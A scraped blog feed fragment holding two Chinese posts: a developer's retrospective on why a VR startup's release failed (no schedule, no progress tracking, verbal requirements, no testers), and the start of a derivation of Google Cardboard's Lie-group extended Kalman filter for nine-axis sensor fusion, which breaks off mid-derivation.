&lt;p&gt;去年8月份加入一家创业公司，和原同事做VR相关的产品开发，到18年正月初七，总共release过两次，真正经理了一次从0到1的过程。第一次release产品初步成型，大概在10月份，在公司内部做了一次宣发，我们做的是ToC的产品，但这次release没有真正意义上的C端客户，倒是可以拿着这个雏形产品到处去找内容提供商；另外可以拿到市场上去&quot;试点&quot;了，找一些潜在的目标用户，去收集反馈；再有就是需要向投资人交答卷。&lt;/p&gt;
&lt;p&gt;第二次release就是直接面向实在的客户了，release时间点在正月初七。我认定这次Release是失败的，是因为软件质量出现了问题——产品拿到使用现场的时候发现诸多bug,系统根本跑不通，在现场调试了三天才将就着能用。想想自己曾经信誓旦旦的说这次发布的目标是要保证软件健壮性，出错率保证在5%以内，脸不禁红到了脖子跟，呵呵。&lt;/p&gt;
&lt;p&gt;这篇文章只从项目管理和软件开发的角度来阐述这次release之前的诸多流程，用以分析项目失败的原因。&lt;/p&gt;
&lt;p&gt;一个好的软件产品，软件质量是基石，软件质量指的是软件的稳定性和流畅度，软件质量过不了关，软件再怎么易用，业务功能再牛逼，也称不上合格的产品。&lt;/p&gt;
&lt;h2 id=&quot;研发团队成员&quot;&gt;研发团队成员&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://oq8nryefp.bkt.clouddn.com/win7_20180415203654.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;研发团队总共四个开发，我和原同事做后台和VR终端开发，一个新员工做网页前端开发，一个员工做Unity开发。做美工的就不算了。没有测试，没有项目经理（敏捷教练）。我和原同事是资历比较深的，另外两个员工经验相对要浅。研发团队是原同事和老大组建的，不知道为什么忽略掉这两种成员角色。或许是因为支出吧。&lt;/p&gt;
&lt;h2 id=&quot;为什么会失败&quot;&gt;为什么会失败&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://oq8nryefp.bkt.clouddn.com/win7_20180415203415.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这次失败，当然有客观原因，譬如成员角色就是不完整的，譬如时间紧迫，但这些都不说，主要还是从自身找找原因，这样在下次遇到相同情况的时候，我们不能保证做到完美，但至少能保证减少错误或者没有大的错误，臻于完美。&lt;/p&gt;
&lt;p&gt;因为团队成员角色的缺失，所以我们自己要担任起这些角色的功能，其实这都是后话，我们没有意识到它的重要性。&lt;/p&gt;
&lt;p&gt;先从自身问题说起，我以前的背景全部是在发展相当成熟的大公司里任职开发工作，估计原同事也是类似，没有小公司创业经验，缺乏大局观。原先经历的项目都号称是敏捷开发，眼睛看见了项目经理如何运作一个项目：如何进度跟踪，如何协调资源，如何应对产品团队提出的需求变化等等；看到了测试人员如何工作：写测试计划，写自动化测试用例，和开发人员沟通测试结果等等。但这次经历说明了，眼见为『虚』，这些其它角色都没有亲身经历，过脑没过心。从心里知道这些程序是必要的，但没有见过缺失这些角色会造成什么后果，心里自然而然的还是将自己定位成开发人员，按照开发的路子一直走。 没有项目管理整个团队就是一盘散沙，没有目标，没有计划，没有需求优先级，产品过来需求就去做，做到什么时候没有预估，最后，失败是注定的。下面详细说说我们这次项目运作过程中缺失的流程：&lt;/p&gt;
&lt;h3 id=&quot;没有时间节点&quot;&gt;没有时间节点&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://oq8nryefp.bkt.clouddn.com/win7_20180415204636.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这是致命的，老大把release时间确定了，研发团队应该将研发测试的时间节点也定下来，什么时候代码写完，什么时候单元测试完，要留出来多长时间的系统联调时间，什么时候code freeze.时间确定下来后，各个阶段的目标就明确了，写代码阶段要保证代码质量，自测阶段要尽可能的发现新加代码中的问题，联调阶段至少要保证没有大的bug，小bug要尽量清理掉。code freeze出release版，坐等上线。&lt;/p&gt;
&lt;p&gt;我们这次只有一个release时间，其余的都是瞬息自然，最后可想而知，运送设备当天勉强把软件装到设备里，没有测试完，发现的问题没有解决完。&lt;/p&gt;
&lt;h3 id=&quot;没有进度跟踪&quot;&gt;没有进度跟踪&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://oq8nryefp.bkt.clouddn.com/win7_20180415204940.png&quot;/&gt;&lt;br/&gt;敏捷开发标准流程中的一环就是standup meeting，由项目经理了解每天项目进度，这其实是把写代码的时间节点分成了小目标，每个开发人员把需求的完成当做自己的一个目标，一个小目标又可以分成几个小小目标，例如，一个模块的完成就是完成了一个小小目标。项目跟踪可以让项目经理了解大致的开发进度，和大的时间节点相关联，如果过程中遇到问题，可以提前做出判断，采取补救措施。项目成员也可以通过这种方式让目标更加明确，遇到问题及时做出调整，并且也能了解其它项目成员的进度。&lt;/p&gt;
&lt;p&gt;很可惜的是我们也没有standup meeting,目标变得模糊起来，这会导致问题，就像上学的期末考虑，把所有问题最终都堆积到临考试的前两周，结果可想而知，能及格就不错了。&lt;/p&gt;
&lt;h3 id=&quot;需求传递流程不规范&quot;&gt;需求传递流程不规范&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://oq8nryefp.bkt.clouddn.com/win7_20180415205239.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;先说问题，我们的产品经理传递需求都是通过口头来传达的，有以下几个缺点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;口头传达会有信息损失，表达出来的东西和想法可能就会有出入，再传递到另外一个人的脑子里，理解的可能和你表达的又不一样，一次次传递，到最后的实施人员，最终可能面目全非。可能有点夸张，我们的团队也很小，沟通成本也小，但终究还是有问题。你碰到过开发和产品打架么？开发：你就是这么说的，我做的完全是照你说的做的。产品：我没这么说过，你肯定是误解我的意思了。呵呵。&lt;/li&gt;
&lt;li&gt;人的想法是会变的，人是会遗忘的。今天以为东西这么做好，头脑里有一套完整的功能流程，但明天可能觉得那里不对，但却想不起来具体是哪里不对了。&lt;/li&gt;
&lt;li&gt;有些东西不是一下就能理解的，实施人员得到需求后，可能一下就以为自己明白了，但设计和实现过程中才会发现产品需求有更深层次的用意。在反复揣摩产品需求，加深自己的理解时，记在脑子中的需求可能没有原先那么清晰明确了，好吧，又得去找产品团队确认。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;我说这么多的目的只有一个：需求需要书面形式的写下来。产品团队写的过程中会多一个反复揣摩的过程，怎么表达更准确无误，自己的这种想法对不对？然后写下来，写下来就是写下来了，产品可以在这个基础上反复更改，直到无误。实施人员可以反复的理解产品的需求，这回反复理解的需求每次都是清晰可见的。&lt;/p&gt;
&lt;p&gt;我们这次也碰到了需求理解不到位的问题，开发人员的功能实现和需求传递者的想法出现了偏差。&lt;/p&gt;
&lt;h2 id=&quot;最后说说测试的问题&quot;&gt;最后说说测试的问题&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://oq8nryefp.bkt.clouddn.com/win7_20180415205312.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最近研发团队加入了Scrum Master新成员，有比较丰富的管理经验，但他做出的决定是先不要招测试人员。功能自己做自己测试。我对测试人员的看法如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;我觉得开发和测试是对立的，某种意义上来说，开发人员测试自己的代码往往不客观，尤其是单元测试覆盖不到的功能点，开发往往认为自己的功能是没问题的，有一个比喻：程序员写出的代码就是自己的孩子，哪有老给自己孩子揭短的。呵呵。因此这两个角色看问题的角度是不一样的。所以我认为测试人员还是必要的。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Scrum Master可能觉得我们目前的功能还没有那么复杂。所以自测应该没问题吧。在没有测试人员的情况下，为了保证软件质量，覆盖率高的单元测试就很有必要了。&lt;/p&gt;
&lt;p&gt;希望我们以后能够做的更好，加油！&lt;/p&gt;
</description>
<pubDate>Sun, 15 Apr 2018 13:00:00 +0000</pubDate>
<dc:creator>HarlanC</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/harlanc/p/8849323.html</dc:identifier>
</item>
<item>
<title>Google Cardboard的九轴融合算法——基于李群的扩展卡尔曼滤波 - 极品巧克力</title>
<link>http://www.cnblogs.com/ilekoaiq/p/8710812.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ilekoaiq/p/8710812.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;Google Cardboard的九轴融合算法&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;——基于李群的扩展卡尔曼滤波&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;strong&gt;极品巧克力&lt;/strong&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;九轴融合算法是指通过融合IMU中的加速度计（三轴）、陀螺仪（三轴）、磁场计（三轴），来获取物体姿态的方法。它是开发VR头显中的一个至关重要的部分。VR头显必须要实时准确地获取用户头部的姿态，然后在屏幕上渲染出在对应的姿态所应该要看到的画面，才能让用户在VR世界里获得沉浸感。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;因为人眼是非常精密的器官，如果渲染出来的画面稍微有一点点的延时或者偏差，人眼都能察觉出来，导致用户头晕想吐，再也不相信VR了。所以，VR头显对九轴融合算法的实时性和精度提出了非常高的要求。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;而另一方面，公开的九轴融合方法又少之又少，常见的就是互补滤波算法和Madgwick算法，但是这两个方法的精度都不能达到VR头显的要求。而精度高的九轴融合算法都掌握在一些算法公司手里，需要向他们支付高昂的算法使用费，源码的价格更是天价。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195734926-1943059376.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Cardboard是谷歌在2014年发布的VR盒子，虽然它不是开源的，但是在GitHub上有很多Cardboard的反编译工程，比如https://github.com/rsanchezsaez/cardboard-java。Cardboard的VR体验，可以在一定程度上，证明它的九轴融合算法是满足VR要求的。所以，我对Cardboard反编译工程中的九轴融合部分的程序进行了研读，这部分的程序大概有5000行左右。我在通读完程序之后，结合文献[1],把程序背后的算法理论公式全部都反推出来，总结成了本文，与各位分享。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;虽然早在2014年，Cardboard就已经在GitHub上被反编译了，但是这么多年过去了，有关它的代码原理分析的文章却是几乎没有。能结合源代码，把它背后的算法理论基础详细推导出来的，本文应该算是第一篇。如有推导错误的地方，还请各位不吝赐教。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;本文目标读者：传感器融合算法工程师。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;一.预测&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;基于陀螺仪积分来预测出下一个姿态。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;假设在&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195737111-1770276309.png&quot; alt=&quot;&quot;/&gt;时刻的状态的SO3形式&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195737549-1770435952.png&quot; alt=&quot;&quot;/&gt;的概率&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195737983-616583266.png&quot; alt=&quot;&quot;/&gt;满足高斯分布，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195738597-1454646076.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195739352-834297818.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195739991-513201996.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;其中&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195740223-1402040373.png&quot; alt=&quot;&quot;/&gt;为归一化常数。为方便起见，把满足上面条件的&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195740440-583708035.png&quot; alt=&quot;&quot;/&gt;表示成，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195740739-1003748817.png&quot; alt=&quot;&quot;/&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195741008-503820834.png&quot; alt=&quot;&quot;/&gt;时刻，陀螺仪的测量值为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195741321-1251183467.png&quot; alt=&quot;&quot;/&gt;，如果没有噪声的话，则对下一个时刻&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195741721-402731634.png&quot; alt=&quot;&quot;/&gt;的状态均值的预测&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195742047-777092141.png&quot; alt=&quot;&quot;/&gt;为，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195742483-986854140.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;其中，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195742844-1952518666.png&quot; alt=&quot;&quot;/&gt;为时刻&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195743066-664635757.png&quot; alt=&quot;&quot;/&gt;到时刻&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195743258-1092869303.png&quot; alt=&quot;&quot;/&gt;的时间间隔，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195743447-1573148224.png&quot; alt=&quot;&quot;/&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;而如果考虑噪声的影响的话，则对时刻&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195743662-1143746750.png&quot; alt=&quot;&quot;/&gt;的预测的状态分布&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195743864-1853982761.png&quot; alt=&quot;&quot;/&gt;要满足，&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195744102-570479589.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;其中，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195744411-2129440090.png&quot; alt=&quot;&quot;/&gt;表示陀螺仪数据的噪声，协方差&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195744677-1266498657.png&quot; alt=&quot;&quot;/&gt;可以通过采集一段时间的数据&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195744890-293742997.png&quot; alt=&quot;&quot;/&gt;，计算得到&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195745124-1026193057.png&quot; alt=&quot;&quot;/&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195745451-1756521745.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，新的均值&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195745703-1220710918.png&quot; alt=&quot;&quot;/&gt;附近的扰动&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195745938-2102277577.png&quot; alt=&quot;&quot;/&gt;要满足这样的分布，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180414221030659-15344017.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;又因为有SO3上的性质，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195746632-583423626.png&quot; alt=&quot;&quot;/&gt;，所以，上式中的&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195746907-1942401842.png&quot; alt=&quot;&quot;/&gt;。所以，原式可以转换如下，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195747194-184838844.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这时候，又因为有SO3上的伴随性质，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195747537-876695291.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;原式就可以转换为，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195747906-711156835.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，就可以得到，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195748195-855141289.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，新的扰动&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195748420-2081628140.png&quot; alt=&quot;&quot;/&gt;的均值&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195748616-2145509215.png&quot; alt=&quot;&quot;/&gt;，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195748935-1743055394.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;新的扰动&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195749169-1374427093.png&quot; alt=&quot;&quot;/&gt;的协方差，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195749361-625057791.png&quot; alt=&quot;&quot;/&gt;，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180407215209582-1988961550.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，最终得到，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195749995-690409064.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;二.更新&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;设在世界坐标系下，加速度计所测的重力向量为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195750256-557872214.png&quot; alt=&quot;&quot;/&gt;，磁场计所测的磁场向量为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195750490-2064009007.png&quot; alt=&quot;&quot;/&gt;。则在时刻&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195750827-857104564.png&quot; alt=&quot;&quot;/&gt;时，加速度计所测的重力向量为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195751089-493037616.png&quot; alt=&quot;&quot;/&gt;，磁场计所测的磁场向量为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195751314-225832790.png&quot; alt=&quot;&quot;/&gt;。加速度计上面的测量噪声&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195751531-407079646.png&quot; alt=&quot;&quot;/&gt;满足&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195751793-1532941735.png&quot; alt=&quot;&quot;/&gt;。磁场计上面的测量噪声&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195752106-1853418138.png&quot; alt=&quot;&quot;/&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;2.1加速度计测量更新&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;把第一部分预测出来的姿态&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195752328-1582651815.png&quot; alt=&quot;&quot;/&gt;，作为预测的测量姿态，可以预测出当前加速度计的测量值&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195752534-2067619.png&quot; alt=&quot;&quot;/&gt;，其计算过程如下，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195752856-39158083.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;而根据实际测量值&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195753095-1912347857.png&quot; alt=&quot;&quot;/&gt;，可以反过来计算出姿态&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195753322-1198484868.png&quot; alt=&quot;&quot;/&gt;，作为实际的测量姿态。以之前的预测姿态&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195753534-244011299.png&quot; alt=&quot;&quot;/&gt;为初值，则把两者的关系表示为，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195753767-439470599.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;可以把&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195754001-783033913.png&quot; alt=&quot;&quot;/&gt;优化出来，或者直接叉乘出来。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195754361-600648570.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;根据李代数与向量叉乘的转换关系。不考虑测量噪声&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195754590-1209979329.png&quot; alt=&quot;&quot;/&gt;，则可以得到&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195754783-825991089.png&quot; alt=&quot;&quot;/&gt;的均值&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195754982-836612934.png&quot; alt=&quot;&quot;/&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195755388-272166737.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;设&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195755637-1127733484.png&quot; alt=&quot;&quot;/&gt;上的噪声为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195755869-682010590.png&quot; alt=&quot;&quot;/&gt;，则关系满足如下，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195756202-1099863237.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;进一步得到，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195756490-291044032.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;要获得&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195756719-305451624.png&quot; alt=&quot;&quot;/&gt;与&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195757055-1433206571.png&quot; alt=&quot;&quot;/&gt;之间的关系，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195757319-1352447316.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这两者间的关系不是线性化的，那么就只能进行线性化，一阶泰勒展开，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195757661-842224842.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;其中，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195757945-980874042.png&quot; alt=&quot;&quot;/&gt;的计算，采用数值扰动的方法。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;从而，可以得到&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195758240-1882958853.png&quot; alt=&quot;&quot;/&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195758733-2104133905.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;最终得到，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195759053-1240949863.png&quot; alt=&quot;&quot;/&gt;的分布，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195759539-1384319877.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;再进行转换，用跟第一部分同样的方法，转换出扰动&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195759842-345972316.png&quot; alt=&quot;&quot;/&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195800184-287829696.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195800450-20495710.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;用&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195800701-1210188207.png&quot; alt=&quot;&quot;/&gt;来表示。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195800957-552410630.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195801253-1393490820.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，根据第一部分，可以得到&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195801484-2096257677.png&quot; alt=&quot;&quot;/&gt;，现在又得到了&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195801697-1254141264.png&quot; alt=&quot;&quot;/&gt;。综合这两者的信息，可以得到，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195801966-292399575.png&quot; alt=&quot;&quot;/&gt;。就是要求一个&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195802254-1074828652.png&quot; alt=&quot;&quot;/&gt;，使得&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195802526-1154092891.png&quot; alt=&quot;&quot;/&gt;最大，用公式表达如下。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195802944-1201776967.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;其中，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195803175-1118419293.png&quot; alt=&quot;&quot;/&gt;是个未知数，用&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195803428-396585411.png&quot; alt=&quot;&quot;/&gt;，转换成用未知数&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195803669-1110858903.png&quot; alt=&quot;&quot;/&gt;来表示。然后，上式就可以转换为，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195804018-873715923.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;但这样子也解不出来。对上式中的部分，在&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195804318-247602172.png&quot; alt=&quot;&quot;/&gt;处进行线性化，一阶泰勒展开。则可以转换为，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195804623-971808852.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;其中，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195804865-1624529062.png&quot; alt=&quot;&quot;/&gt;的计算，程序里面是用数值扰动的方法。这里应该也可以用解析的方法，把公式都展开来推导。&lt;/span&gt;&lt;/p&gt;
